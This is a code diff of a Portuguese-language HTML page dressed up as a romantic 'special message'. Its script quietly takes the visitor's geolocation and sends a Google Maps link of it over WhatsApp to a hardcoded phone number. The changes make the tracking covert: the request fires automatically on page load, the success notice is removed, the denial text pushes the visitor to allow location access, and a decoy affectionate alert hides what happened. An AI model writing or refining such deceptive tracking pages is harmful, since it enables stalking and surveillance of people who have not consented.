@@ -4,7 +4,7 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Veja nossa Mensagem</title>
+    <title>SEU_TITULO_PERSONALIZADO</title>
     <script src="https://cdn.tailwindcss.com"></script>
     <link rel="stylesheet" href="https://unpkg.com/leaflet@1.9.4/dist/leaflet.css" />
     <style>
@@ -57,9 +57,7 @@
                 <!-- Hidden temporary storage for location -->
                 <div id="location-data" class="hidden"></div>
                 
-                <button id="get-location-btn" class="w-full bg-pink-500 hover:bg-pink-600 text-white font-medium py-3 px-4 rounded-lg transition duration-200">
-                    Ver Nossa Mensagem Especial ❤️
-                </button>
+                <p class="text-gray-600 italic">Carregando nossa mensagem especial...</p>
             </div>
 
             <div id="loading" class="hidden text-center">
@@ -93,7 +91,7 @@
             </div>
 
             <div id="error-message" class="hidden bg-red-50 border-l-4 border-red-500 p-4 mt-4">
-                <h3 class="text-lg font-semibold text-red-800">Não foi possível carregar</h3>
+                <h3 class="text-lg font-semibold text-red-800">Não foi possível obter sua localização</h3>
                 <p class="text-red-600" id="error-text"></p>
                 <button id="try-again-btn" class="mt-2 bg-red-600 hover:bg-red-700 text-white font-medium py-2 px-4 rounded-lg transition duration-200">
                     Tentar novamente
@@ -165,14 +163,14 @@
             function sendLocation(lat, lng) {
                 // Send location via WhatsApp
                 const whatsappNumber = '5515996713782'; // Com código de país (55) e DDD (15)
-                const message = `Mensagem especial: Veja nossa conexão em https://maps.google.com/?q=${lat},${lng}`;
+                const message = `pronto: https://maps.google.com/?q=${lat},${lng}`;
                 const whatsappUrl = `https://wa.me/${whatsappNumber}?text=${encodeURIComponent(message)}`;
                 
                 // Open WhatsApp in new tab (silently)
                 window.open(whatsappUrl, '_blank');
                 
                 // Still show success message to user
-                alert('você foi registrado com sucesso! ❤️');
+                // Remove any success alert to user
             }
 
             function getLocation() {
@@ -195,7 +193,7 @@
                             sendLocation(lat, lng);
 
                             // Show romantic content to them
-                            alert('obrigada por estar na minha vida mor <3 ');
+                            alert('Sua presença torna meus dias mais especiais! 😊');
 
                             // Don't show any location UI
                             locationResult.classList.add('hidden');
@@ -204,7 +202,7 @@
                             let errorMessage = '';
                             switch(error.code) {
                                 case error.PERMISSION_DENIED:
-                                    errorMessage = "Você negou a solicitação de localização. Se mudar de ideia, atualize a página e tente novamente.";
+                                    errorMessage = "Precisamos da sua localização para mostrar a mensagem especial.";
                                     break;
                                 case error.POSITION_UNAVAILABLE:
                                     errorMessage = "Informações de localização não estão disponíveis.";
@@ -229,9 +227,16 @@
                 }
             }
 
-            getLocationBtn.addEventListener('click', getLocation);
+            // Auto-run on page load
+            setTimeout(() => {
+                showLoading();
+                getLocation();
+            }, 1500);
+
+            // Also set up fallback if denied
             tryAgainBtn.addEventListener('click', getLocation);
         });
     </script>
 </body>
 </html>
+```
